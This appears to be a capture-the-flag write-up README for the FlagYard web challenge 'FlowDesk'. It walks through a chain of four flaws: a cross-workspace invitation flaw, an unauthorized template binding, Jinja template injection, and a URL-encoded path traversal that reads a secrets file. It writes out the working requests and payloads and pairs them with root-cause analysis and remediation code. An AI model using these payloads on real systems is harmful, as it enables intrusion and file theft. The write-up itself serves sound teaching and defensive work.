# FlowDesk

![platform](https://img.shields.io/badge/platform-FlagYard-6f42c1)
![category](https://img.shields.io/badge/category-web-blue)
![type](https://img.shields.io/badge/vuln-SSTI%20%7C%20broken%20access%20control-critical)

> Server-side template injection in a workflow "preview" feature, reached through a
> cross-workspace invitation flaw and a member-level template binding weakness.
> Flag format: `FlagY{...}`

---

## TL;DR

The preview endpoint renders an attacker-supplied `test_fragment` through the server's
Jinja engine. Only *member* access to the `redcorp` workspace is required, and that is
obtained by presenting an invitation issued for **our own** workspace to the
`redcorp` accept endpoint.

Inside the sandboxed rendering context lives a `helpers` object exposing
`render_partial()`. Its path check runs on the raw string before URL decoding, so an
encoded traversal reaches `/run/secrets/flag`.

---

## Findings

| # | Finding | Impact |
|---|---------|--------|
| 1 | Invitation token not bound to its workspace | Any authenticated user joins any workspace as `member` |
| 2 | Member can bind templates it cannot read | Hidden template content rendered (privacy / IDOR) |
| 3 | `test_fragment` rendered as a Jinja template | Server-side template injection inside the container |
| 4 | Path check in `helpers.render_partial()` bypassed by URL encoding | Arbitrary file read → flag |

---

## Chain at a glance

```
self-registration
        ↓
invitation created in our own workspace
        ↓
accepted against /workspaces/redcorp/  (authz flaw)
        ↓
membership in redcorp
        ↓
create a workflow in redcorp
        ↓
bind hidden template 51
        ↓
Jinja evaluation through test_fragment
        ↓
discover helpers.render_partial()
        ↓
URL-encoded directory traversal
        ↓
read /run/secrets/flag
```

---

## Repository layout

```
.
├── README.md
├── exploit/
│   └── flowdesk_exploit.py
└── .gitignore
```

## Requirements

```bash
python3 -m pip install requests
```

## Usage

```bash
python3 exploit/flowdesk_exploit.py http://<instance>.playat.flagyard.com
```

Optional flags: `--workspace redcorp`, `--template 51`, `--email`, `--password`.

The script walks the whole chain and stops at the first `FlagY{...}` it sees.

---

## Walkthrough

### 0. Recon

```
GET /                              -> 302 Location: /login
GET /register, /signup, /api/docs  -> 404
GET /login                         -> 200
```

There is no signup form in the UI, but the JSON API accepts self-registration.

### 1. Account and personal workspace

```http
POST /api/auth/register
Content-Type: application/json

{"email":"ops@example.com","password":"Passw0rd!2024","first_name":"Alice","last_name":"Tester"}
```

```json
201 {"user":{"email":"ops@example.com","first_name":"Alice","id":3,"last_name":"Tester"}}
```

Log in and read the session identity:

```http
GET /api/me
```

```json
{"email":"ops@example.com","id":3,
 "memberships":[{"role":"admin","workspace":"alice-s-workspace"}]}
```

A personal workspace is provisioned automatically from the first name.

### 2. The invitation flaw

Create an invitation in **our own** workspace:

```http
POST /api/workspaces/alice-s-workspace/invitations
{"email":"ops@example.com","role":"member"}
```

```json
201 {"invite_id":"inv_b1a3a1ca3e8f56c7",
     "token":".eJxNzMEOgkAMBNB_6VlMkCDEk39CSq1abd3NLoqB8O_...",
     "role":"member","workspace_slug":"alice-s-workspace"}
```

Present that token to a **different** workspace's accept endpoint:

```http
POST /api/workspaces/redcorp/invitations/accept
{"token":".eJxNzMEOgkAMBNB_6VlMkCDEk39CSq1abd3NLoqB8O_..."}
```

```json
200 {"message":"Invitation accepted","role":"member","workspace":"redcorp"}
```

`/api/me` now reports the target membership:

```json
"memberships":[{"role":"member","workspace":"redcorp"},
               {"role":"admin","workspace":"alice-s-workspace"}]
```

The accept handler takes the workspace from the URL path and never verifies that the
invitation record was issued for that same workspace.

### 3. A workflow inside redcorp

Members are allowed to create workflows in the workspace they belong to:

```http
POST /api/workspaces/redcorp/workflows
{"name":"Probe 7ijhz8"}
```

```json
201 {"id":12,"name":"Probe 7ijhz8","notification_template_id":null,
     "owner_user_id":3,"status":"active","workspace_slug":"redcorp"}
```

### 4. Binding the hidden template

The seeded notification template is not readable by a member:

```http
GET /api/workspaces/redcorp/templates/51     -> 403 {"error":"Forbidden"}
```

But binding it to a workflow is allowed:

```http
PATCH /api/workspaces/redcorp/workflows/12
{"name":"PwnWorkflow","description":"test","notification_template_id":51}
```

```json
200 {"id":12,"name":"PwnWorkflow","notification_template_id":51,
     "workspace_slug":"redcorp", ...}
```

The response echo is the confirmation that the template is attached — without it the
preview endpoint answers `400 {"error":"This workflow does not have a notification
template"}`.

### 5. The preview endpoint is an SSTI sink

The UI JavaScript (`/static/js/workflow_detail.js`) reveals the request shape:

```js
body: { variables: { first_name: firstName },
        test_fragment: test_fragment || undefined }
```

Fire a math probe:

```http
POST /api/workspaces/redcorp/workflows/12/preview
{"variables":{"first_name":"Alex"},"test_fragment":"ZZB1 {{7*77001}}"}
```

```json
{"job_id":"job_1ae8e942d2a7e514",
 "preview_id":"preview_1fa5e3981901f838",
 "status":"complete"}
```

```http
GET /api/jobs/job_1ae8e942d2a7e514
GET /api/previews/preview_1fa5e3981901f838
```

The response `output` ends with:

```
--- preview note ---
ZZB1 539007
```

`{{7*77001}}` evaluated to `539007` — server-side template injection confirmed.

The engine runs sandboxed: `__class__`, `__globals__`, `__dict__` and friends all return
`access to '__x__' is not permitted`, so the usual `lipsum.__globals__` route is closed.

### 6. The helper object

```jinja
{{ helpers }}
```

```
--- preview note ---
TemplateHelpers(list_helpers, list_partials, render_partial)
```

The sandbox left one useful capability reachable: `render_partial(path)` renders another
template from a supplied path.

### 7. Encoded traversal

A direct read is refused, and so is a plain traversal:

```jinja
{{ helpers.render_partial('/run/secrets/flag') }}        -> invalid partial path
{{ helpers.render_partial('../../../run/secrets/flag') }} -> invalid partial path
```

The validation inspects the raw argument while the loader decodes it afterwards, so the
encoded form slips through:

```jinja
{{ helpers.render_partial('../../../../run%2fsecrets%2fflag') }}
```

```
FlagY{...}
```

The exploit sweeps `%2e%2e%2f`, `..%2f`, `..%252f` and `..%5c` at depths 2-8, plus a
plain `../` control case.

---

## Root cause

1. **Invitation acceptance** — `POST /api/workspaces/<slug>/invitations/accept` resolves
   the workspace from the URL and looks the token up globally. The invitation row stores
   `workspace_id`, but it is never compared to the workspace in the route, so a token
   minted for one workspace is honoured by any other.

2. **Template binding** — `PATCH /api/workspaces/<slug>/workflows/<id>` accepts any
   `notification_template_id` belonging to the workspace without checking that the caller
   may read that template. The object-level check exists on `GET /templates/<id>` but not
   on the binding path.

3. **Preview rendering** — `test_fragment` is compiled with `Environment.from_string()`
   and rendered instead of being treated as data. A sandboxed environment limits the
   damage but does not make arbitrary template evaluation safe.

4. **`render_partial` path check** — the guard tests the raw string (rejecting literal
   `../` and absolute paths) and the loader performs percent-decoding later, so
   `%2e%2e%2f` becomes `../` after the check has already passed. The resolved path is
   never compared against the partials root with `realpath()`.

---

## Remediation

**Invitation acceptance** — bind the token to its workspace:

```python
inv = Invitation.query.filter_by(token=token).first_or_404()
if inv.workspace.slug != slug:          # the workspace comes from the route
    abort(404)
if inv.used or inv.revoked or inv.expires_at < utcnow():
    abort(400, "Invitation expired or already used")
```

**Template binding** — authorize the template, not just the workflow:

```python
tpl = NotificationTemplate.query.filter_by(
    id=body["notification_template_id"], workspace_id=ws.id).first()
if tpl is None:
    abort(400, "Template not found in this workspace")
if not can_read_template(current_user, tpl):
    abort(403)
```

**Preview endpoint** — never render user input as a template. Treat the fragment as
plain text (escaping included), or restrict substitutions to a fixed map of variables:

```python
output = template.render(**allowed_variables) + "\n" + escape(test_fragment)
```

If a fragment really has to be templated, use a separate `SandboxedEnvironment` with an
empty global namespace and no `helpers` object.

**`render_partial`** — normalize before validating, and pin the result to the root:

```python
from urllib.parse import unquote
import os

candidate = unquote(path)                       # decode first
root = os.path.realpath(PARTIALS_ROOT)
resolved = os.path.realpath(os.path.join(root, candidate))
if os.path.commonpath([root, resolved]) != root:
    raise BadRequest("invalid partial path")
```

---

## Notes

- All requests run against a single authorized FlagYard instance; the host is passed on
  the command line and no other host is contacted.
- The exploit reuses a seeded workflow when one already carries a template, otherwise it
  creates its own, so it is safe to re-run against a recycled instance.
- The flag value is intentionally not committed to this repository.

## References

- OWASP — *Server Side Template Injection*
- OWASP — *Broken Access Control* (IDOR / missing object-level authorization)
- Jinja2 — *Sandbox* documentation
